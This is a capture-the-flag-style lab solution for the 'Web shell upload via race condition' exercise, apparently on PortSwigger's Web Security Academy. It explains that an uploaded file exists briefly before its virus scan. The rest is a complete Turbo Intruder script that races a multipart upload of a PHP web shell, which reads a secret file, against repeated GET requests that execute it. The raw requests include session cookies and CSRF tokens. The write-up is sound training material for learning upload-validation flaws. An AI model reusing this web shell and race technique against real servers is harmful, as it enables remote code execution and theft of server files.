# Web shell upload via race condition
Solution:
- Files are uploaded at `/files/avatars/`
- We can only upload png and jpg files.
- The files are being checked by the server if it contains viruses or not. During this checking, the file is actually present in the system for a few milliseconds.
- We use TurboIntruder to quickly request the POST (to submit webshell) and GET (to execute the webshell) requests. Select the two requests in burp proxy history and send to turbo intruder.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           )

    request1 = '''POST /my-account/avatar HTTP/1.1
Host: ac8d1f031e35f169c028a6f800a8006a.web-security-academy.net
Cookie: session=uWtrh3v8yyFY6a817tQEwzzTUne73AWU
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------18497457955814865612237312216
Content-Length: 556
Origin: https://ac8d1f031e35f169c028a6f800a8006a.web-security-academy.net
Referer: https://ac8d1f031e35f169c028a6f800a8006a.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

-----------------------------18497457955814865612237312216
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------18497457955814865612237312216
Content-Disposition: form-data; name="user"

wiener
-----------------------------18497457955814865612237312216
Content-Disposition: form-data; name="csrf"

zs1i3g6ilutOgBMw12X4edsmsOuYwe53
-----------------------------18497457955814865612237312216--
'''
    request2 = '''GET /files/avatars/shell.php HTTP/1.1
Host: ac8d1f031e35f169c028a6f800a8006a.web-security-academy.net
Cookie: session=uWtrh3v8yyFY6a817tQEwzzTUne73AWU
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

'''
    
    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for i in range(5):
        engine.queue(request2, gate='race1')
        #engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```
